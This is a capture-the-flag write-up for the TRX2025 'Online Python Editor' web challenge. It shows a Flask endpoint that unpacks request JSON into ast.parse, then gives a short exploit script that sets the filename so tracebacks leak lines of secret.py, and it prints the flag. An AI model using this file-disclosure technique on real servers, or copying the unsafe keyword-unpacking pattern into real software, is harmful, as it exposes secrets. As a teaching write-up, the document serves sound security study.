---
title: Trx2025 | Online Python Editor
published: 2025-03-11
description: If you're tired of fast and good-looking editors, try this. Now with extra crispiness!
image: ''
tags: ["web"]
authors: ["akiidjk"]
solves: -1
points: -1
firstblood: false
category: Trx2025
draft: false

---



## Introduction

This is the first web in the TRX2025 CTF. And it's basically a simple online Python editor with a syntax checker.

## Source

Go to the source code and we can immediately see two things:

1. In a file called `secret.py`, which is never called, read or otherwise used.

2. The main `app.py` file

```python
# filename: app.py

import ast
import traceback
from flask import Flask, render_template, request

app = Flask(__name__)

@app.get("/")
def home():
    return render_template("index.html")

@app.post("/check")
def check():
    try:
        ast.parse(**request.json)
        return {"status": True, "error": None}
    except Exception:
        return {"status": False, "error": traceback.format_exc()}

if __name__ == '__main__':
    app.run(debug=True)

```

What happens is that the template is rendered and every N seconds the `check` method is called, which parses the Python code sent by the client and returns the traceback, which is very useful for us later.

## Solution

Where's the vuln? Well, it's quite simple here: `ast.parse(**request.json)`, The call to `ast.parse` is vulnerable to Python code injection, in fact we can pass arbitrary parameters to the function (because of the `**request.json`), and if we look at the documentation for `ast.parse` we know that we can pass a filename to the function, and ast.parse uses something like `compile(source, filename, mode, PyCF_ONLY_AST)`, which allows us to leak sensitive information causing syntax errors in specific lines of code.

So finally we get

```python
# filename: exploit.py

#!/usr/bin/python3
import requests

BASE_URL = "http://python.ctf.theromanxpl0.it:7001/"

def check():
    r = requests.post(BASE_URL + "/check", json={"source": "\n\n\n\n\n;","filename":"./secret.py", })
    if 'error' != None:
        print(r.json()['error'])
    else:
        print(r.json())

def main():
    check()


if __name__ == "__main__":
	main()


# goodluck by @akiidjk

```

flag: :spoiler[TRX{4ll_y0u_h4v3_t0_d0_1s_l00k_4t_th3_s0urc3_c0d3}]
